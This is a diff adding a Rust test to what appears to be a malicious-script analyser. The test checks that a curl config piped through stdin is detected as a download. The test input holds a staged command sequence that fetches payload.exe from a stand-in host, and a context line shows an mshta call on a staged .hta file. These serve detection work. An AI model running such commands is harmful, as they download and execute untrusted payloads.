@@ -18488,6 +18488,7 @@ mod powershell_tests {
 
 #[cfg(test)]
 mod curl_tests {
+    use crate::analyze;
     use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
@@ -19075,6 +19076,28 @@ mshta C:/Temp/stage.hta"#,
             ),
             "curl config file did not record destination: {:?}",
             env.modified_filesystem
+        );
+    }
+
+    #[test]
+    fn curl_stdin_config_from_type_pipeline_reads_url_and_output() {
+        let report = analyze(
+            br#"echo url = "https://curl-stdin-config.example/payload.exe">curl.cfg
+echo output = "payload.exe">>curl.cfg
+type curl.cfg | curl -K -"#,
+            &Config::default(),
+        );
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-stdin-config.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "curl stdin config did not emit structured download: {:?}\n{}",
+            report.traits,
+            report.deobfuscated
         );
     }
 }
